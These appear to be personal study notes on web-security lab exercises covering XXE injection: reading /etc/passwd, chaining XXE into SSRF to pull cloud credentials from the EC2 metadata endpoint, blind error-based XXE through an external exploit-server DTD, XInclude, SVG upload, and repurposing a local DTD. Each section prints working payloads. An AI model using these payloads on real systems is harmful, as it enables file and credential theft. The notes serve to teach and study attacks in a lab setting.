______________

# Lab: Exploiting XXE using external entities to retrieve files

- For this exercise we will be executing a **XML external entity (XXE) injection** with the purpose of exfiltrate **/etc/passwd**

    The vulnerability in this exercise is located on the check store, let's capture the request with **Burp Suite**

![[Captura de pantalla 2026-04-08 154958.png]]

- As principal we see a **XML declaration** and behind twe find the **Elements**, we will work on this.

>An essential part of a XXE is to add a malicious **DTD (Document Type Definition)**, let's see an example

```
<?xml version="1.0" encoding="UTF-8"?> 
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]> 
<stockCheck><productId>&xxe;</productId></stockCheck>
```

- Knowing this we need to adapt it to our origninal request

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId><storeId>2</storeId></stockCheck>
```

     We use the wrapper file to list the /etc/passwd

![[Captura de pantalla 2026-04-08 161612.png]]

- Is reporting us successfully the **/etc/passwd**

![[Captura de pantalla 2026-04-08 161642.png]]

- This exercise represents a basic **XML external entity (XXE) injection**

## Gold rule

- As pentesters facing the reality it's crutial to know we can find a **XML declaration** with multuple parameters where only one can be vulnerable, we need to try one by one. In this exercise we have only two because due to educational purposes bur this does not represent the reallity 

_________________

## Exploiting XXE to perform SSRF attacks

- In this exercise we will leverage of a **misconfigured API** as vehicle using the **EC2 metadata endpoint cloud IP** `http://169.254.169.254/` to extract credentials from the **cloud** by **XXE** concatenating to **SSRF**

     leak in this exercise is located on the **check store**, let's capture the request with **burpsuite**

![[Captura de pantalla 2026-04-08 235720.png]]
     Typical XML structure, let's modify it

- We use **SYSTEM** to force the **XML processor** to load data from an external resource (local file or remote URL).

![[Captura de pantalla 2026-04-08 235208.png]]

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/"> ]>
<stockCheck><productId>&xxe;</productId><storeId>2</storeId></stockCheck>
```

![[Captura de pantalla 2026-04-08 235307.png]]


- Due to we are using a **metadata endpoint IP** (Which is used to get server information) our request is taken by the API and once the cloud response as we are not requesting something specific the cloud will report what she got in that directory, in this case `latest`. Finally as our request work on the **productID** request, the response will come as **product ID** 

```
"Invalid product ID: latest"
```
     As the parameter latest it does not exist system is responding like this 

- In accordance with this information, we will continue sending requests with the **Cloud response** till get the credentials 

![[Captura de pantalla 2026-04-08 235520.png]]

- We got the credentials, now let's reload the main page.

![[Captura de pantalla 2026-04-08 235600.png]]

## Key point

- The attack we execute in this execirse highlight two critical points as **security measures** allowing us to concatenate from a **XXE attack** to a **SSRF**, let's dive in. Initially **API** has not an accurate configuration and sanitization, it allows add **external entitys** without any filter and second the **Cloud** is not sanitized either this one receives requests without ask for credentials, tokens or any validation, since the request come from the server it accepted which is really dangerous.

_______________

# Lab: Exploiting blind XXE to retrieve data via error messages

- In this exercise we will execute a **blind XXE** through via **error messages**, let's start.

     As the leak resides on the check store let's capture the request with **Burpsuite**

![[Captura de pantalla 2026-04-09 200534 1.png]]
     Regular **XML** structure 

- Let's make a proof with a tipycal **DTD** requesting the **/etc/passwd**

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId><storeId>2</storeId></stockCheck>
```

![[Captura de pantalla 2026-04-09 201534.png]]

>`Entities are not allowed for security reasons` as response by the system give us a relly important clue, it shows us how not to attack.


- **Burpsuite** offer us a server to execute our attack, let's use it 

     We will add the next **DTD**

```
<!ENTITY % file SYSTEM "file:///etc/passwd"> <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>"> %eval; %error;
```

- Here we have the key to solve this exercise, let's dive in. In this exerxise we are applying the concept of **Two entitys** which is really useful, first we declare the request of **/etc/passwd** and in the second declaration is where we **leverage of the error**, we request a file that it does not exist and after we call the first declaration, that way once the system recognize the error this will continue with our declaration and will report the **/etc/passwd**

![[Captura de pantalla 2026-04-09 194039 1.png]]

- Now we need to get the link of our **exploit-server**

![[Captura de pantalla 2026-04-09 193946.png]]

```
https://exploit-0ac70085037c08f2883d015a0188003a.exploit-server.net/exploit
```

- With this done, let's add a **DTD** which will refer our **exploit-server** and will execute the two declarations.

     In this point it's important to remenber  the clue we found initially `Entities are not allowed for security reasons` . For this reason we can not call the **DTD** as **&xxe;** (**general entitys**), actually we don't need to call it, it's already iamong the **brackets** and this away this one will execute the external one (that one on the **exploit-server**). This is known as **parametric entities**
 
![[Captura de pantalla 2026-04-09 200450.png]]

```
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://exploit-0ac70085037c08f2883d015a0188003a.exploit-server.net/exploit">  %xxe;]>
```

- We receive the **/etc/passwd**, let's reload the page.

![[Captura de pantalla 2026-04-09 202320.png]]

- Exercise is solved successfully.

________________
# Lab: Exploiting XInclude to retrieve files

- In this exercise we are facing a modern and really used practice implemented to enforce the web'sites security. Web sites embeds the **XML** product by client-submitted data that way attacker can not modify it avoiding attacks.

     For this situations we can implement **XInclude** which basically It allows embedding an external file within an XML document. The processor sees `<xi:include>`, navigates to the path (such as `file:///etc/passwd`) and "pastes" the text into the document.

- Leak is on the **Check store** let's capture the request with **Burpsuite**

![[Captura de pantalla 2026-04-09 214332.png]]

- Before we use to see the **XML structure** in the request, right now due to the security measures it's not available for us but and here is the magic key, even **if the XML is embeded** if we have access to parameters in use in the **XML structure** and this ones are not protected we can inject exploits in there.

     Exploit 

```
<foo xmlns:xi="http://www.w3.org/2001/XInclude"> <xi:include parse="text" href="file:///etc/passwd"/></foo>
```

[PayloadsAllTheThings/XXE Injection at master · swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection)

![[Captura de pantalla 2026-04-09 214244.png]]

- We got the /etc/passwd as response, ito worked. now let's reload the main page

![[Captura de pantalla 2026-04-09 221619 1.png]]

______________
# Lab: Exploiting XXE via image file upload

- In this exercise we leverage the fact some applications allow users to upload files and Images in formats like **.png .jpeg** and **.svg** in specific too which is the key of this exercise. As the composition of a **.svg** images is completely **XML** we can use to inject **malicious XML** 

![[Captura de pantalla 2026-04-10 224454.png]]

- This exercise has a panel to add commentaries and uploads Images, with the purposes of this exercise let's download an **.svg image** 

![[Captura de pantalla 2026-04-10 224204.png]]

![[Captura de pantalla 2026-04-10 224411 1.png]]

- Once we download the image, we need to change the content for the next **malicious payload**

```
<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>
```

    This script creates an image where will be inserted the info we are requesting, image is the blank canvas and the request is the request

     `the label <text> describe what will be print it on the image`

[PayloadsAllTheThings/XXE Injection at master · swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection#xxe-inside-svg)

- When we post the comment, let's see the comment and something important to highlight is the image, we need to examine it 

![[Captura de pantalla 2026-04-10 224411.png]]
![[Captura de pantalla 2026-04-10 224532.png]]

![[Captura de pantalla 2026-04-10 224634.png]]

- The malicious request is requesting the `/etc/hostname` and this what the image is showing us, let's paste it on the main page 

![[Captura de pantalla 2026-04-10 223819.png]]

- Page accepted our input, exercise solved

![[Captura de pantalla 2026-04-09 221619 1.png]]

## Key point

- The danger of **SVG files** lies in their XML-based nature. The vulnerability isn't in the image itself, but in the backend processing library that resolves external entities when attempting to render the file. By embedding the contents of /etc/hostname within a `<text>` tag, we transform a simple file upload into a visual exfiltration tool, bypassing defenses that only monitor conventional data traffic

___________

# Lab: Exploiting XXE to retrieve data by repurposing a local DTD

- In this exercise we are facing a Web-site which does not accept **Externals DTD's (only internals)** but it accepts **external entities**.

     Let's capture the **stockCheck** request with **Burpsuite** 

![[Captura de pantalla 2026-04-11 191344.png]]
      Regular **XML structure** 

- We leverage the system relies in **internals DTD's** as security measure in order to execute an **internal DTD** as **Trojan horse** and after execute the **main attack**, but before do that we need to test an **internal DTD**

```
<!DOCTYPE foo [ <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd"> %local_dtd; ]>
```
     Internal DTD script

![[Captura de pantalla 2026-04-11 191217 1.png]]

- We receive a **Status code 200** , we confirm the web site **security measure** we expected, now let's proceed to build the **main attack** 

```
<!DOCTYPE message [ 
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd"> 
<!ENTITY % ISOamso ' 
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd"> 
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval; 
&#x25;error; 
'> 
%local_dtd; ]>
```

     <!DOCTYPE message -> we declare the DTD

      <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd"> -> We set-up the Trojan horse (first entity), once we send this; the system open/accepts the funtionality of DTD's (basically give us the permission to run more DTD)

     <!ENTITY % ISOamso ' -> We set-up the main attack, the ISOamso ENTITY content is describe inside the single quotes
      <!ENTITY &#x25; file SYSTEM "file:///etc/passwd"> -> request to the /etc/passwd path (it's importante remember use double quotes due to we already use sinle quotes in the main ENTITY)
      <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>"> -> Right here we use the ENTITY as bait to execute an error and after execute the ENTITY file (where we request the /etc/passwd). We emphasize the use of Unicode characteres to replace some of the script to avoid security filters (many security filters search for specific and specially recognized dangerous characteres)

      &#x25;  -> %
      &#x26;  -> &
      &#x27;  -> '

- Let's run the request.

![[Captura de pantalla 2026-04-11 181654 1.png]]

- It worked successfully.

![[Captura de pantalla 2026-04-11 181736.png]]

## Key points

- This exercise taught us how a security policy of **no external DTDs accepted** is not enough to ensure **Malicious XML** is injected and also the fact of to know certain **internals DTD's** allow us execute **privileges actions** together with the execution of **External entites**. Another important fact regarding the **Web-site security** is recognize **Unicodes characteres** which hide dangerous characteres






















